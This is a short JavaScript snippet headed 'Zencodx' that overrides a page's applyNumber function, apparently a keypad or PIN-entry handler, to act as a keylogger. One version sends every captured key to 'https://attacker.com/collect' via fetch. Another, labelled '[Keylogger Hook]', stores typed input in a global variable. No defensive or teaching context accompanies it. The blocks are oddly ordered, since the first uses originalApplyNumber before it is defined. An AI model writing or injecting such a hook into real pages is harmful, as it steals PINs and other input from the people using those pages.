# Zencodx

window.applyNumber = function(el) {
  const value = el.innerText || el.value || el.getAttribute('data-key') || 'UNKNOWN';
  
  // Send the captured key to attacker's server
  fetch('https://attacker.com/collect?key=' + encodeURIComponent(value));

  return originalApplyNumber.call(this, el);
};





const originalApplyNumber = window.applyNumber;

window.applyNumber = function(el) {
  const value = el.innerText || el.value || el.getAttribute('data-key') || 'UNKNOWN';
  console.log('[Keylogger Hook] Captured key:', value);
  window._capturedInput = (window._capturedInput || '') + value;
  console.log('[Captured Input So Far]:', window._capturedInput);
  return originalApplyNumber.call(this, el);
};
